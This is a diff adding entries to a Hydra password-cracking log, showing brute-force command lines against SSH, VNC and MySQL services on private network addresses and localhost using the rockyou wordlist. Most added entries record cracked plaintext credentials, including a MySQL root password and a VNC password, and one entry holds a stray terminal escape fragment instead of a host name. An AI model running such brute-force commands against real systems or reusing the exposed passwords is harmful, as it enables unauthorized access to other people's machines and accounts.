@@ -44,3 +44,14 @@
 # Hydra v9.4 run at 2023-05-04 13:58:06 on localhost mysql (hydra -l root -P rockyou.txt -t 64 -vV -o output.log -I mysql://localhost)
 [3306][mysql] host: localhost   login: root   password: Cmonster2006!@#!@#!@#
 [3306][mysql] host: localhost   login: root   password: Cmonster2006!@#!@#!@#
+# Hydra v9.4 run at 2023-05-05 11:19:24 on 192.168.1.81 ssh (hydra -l thomassegale -P rockyou.txt -t 64 -vV -o output.log -I ssh://192.168.1.81)
+# Hydra v9.4 run at 2023-05-05 11:23:14 on 192.168.1.99 vnc (hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://192.168.1.99)
+[5900][vnc] host: 192.168.1.99   password: Mm2021M1
+# Hydra v9.4 run at 2023-05-05 11:30:46 on 192.168.1.80 vnc (hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://192.168.1.80)
+[5900][vnc] host: 192.168.1.80   password: Mm2021M1
+# Hydra v9.4 run at 2023-05-05 11:33:20 on 192.168.1.80 vnc (hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://192.168.1.80)
+[5900][vnc] host: 192.168.1.80   password: Mm2021M1
+# Hydra v9.4 run at 2023-05-05 11:35:05 on [A mysql (hydra -l [A -P rockyou.txt -t 64 -vV -o output.log -I mysql://[A)
+# Hydra v9.4 run at 2023-05-05 11:35:44 on localhost mysql (hydra -l root -P rockyou.txt -t 64 -vV -o output.log -I mysql://localhost)
+[3306][mysql] host: localhost   login: root   password: Cmonster2006!@#!@#!@#
+[3306][mysql] host: localhost   login: root   password: Cmonster2006!@#!@#!@#
